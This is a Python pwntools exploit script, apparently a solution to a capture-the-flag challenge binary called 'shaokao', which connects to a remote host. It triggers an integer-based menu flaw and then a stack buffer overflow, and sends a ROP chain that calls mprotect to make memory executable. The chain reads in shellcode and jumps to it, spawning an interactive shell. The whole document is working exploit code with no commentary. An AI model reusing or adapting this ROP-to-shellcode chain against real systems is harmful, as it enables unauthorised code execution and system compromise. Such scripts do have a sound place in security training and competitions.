from pwn import *
context.log_level="debug"
context.arch="amd64"
# sh=process("./shaokao")
# 39.107.137.13 18806
sh=remote("39.107.137.13",18806)
elf=ELF("./shaokao")
def cmd(c):
    sh.sendlineafter(b"> ",str(c).encode())
def jp(num):
    cmd(1)
    sh.recvuntil(b"3. ")
    sh.recvuntil(b"\n")
    sh.sendline(b'1')
    sh.sendlineafter(b"\n", str(num).encode())
def kc(num):
    cmd(2)
    sh.recvuntil(b"3. ")
    sh.recvuntil(b"\n")
    sh.sendline(b'1')
    sh.sendlineafter(b"\n", str(num).encode())
def yue():
    cmd(3)
def own():
    cmd(4)
def game(payload):
    cmd(5)
    sh.sendlineafter(b"\n", payload)
target=0x4E60F0&~0xfff
mprotect=elf.sym['mprotect']
read=elf.sym['read']
poprdi=0x000000000040264f
poprsi=0x000000000040a67e
poprdxrbx=0x00000000004a404b
jp(429486729)
yue()
own()
# gdb.attach(sh)
payload=b'a'*0x28+p64(poprdi)+p64(target)+p64(poprsi)+p64(0x1000)+p64(poprdxrbx)+p64(7)*2+p64(mprotect)
payload+=p64(poprdi)+p64(0)+p64(poprsi)+p64(target)+p64(poprdxrbx)+p64(0x50)*2+p64(read)
payload+=p64(target)
game(payload)
shellcode=asm(shellcraft.sh())
sleep(1)
sh.sendline(shellcode)
sh.interactive()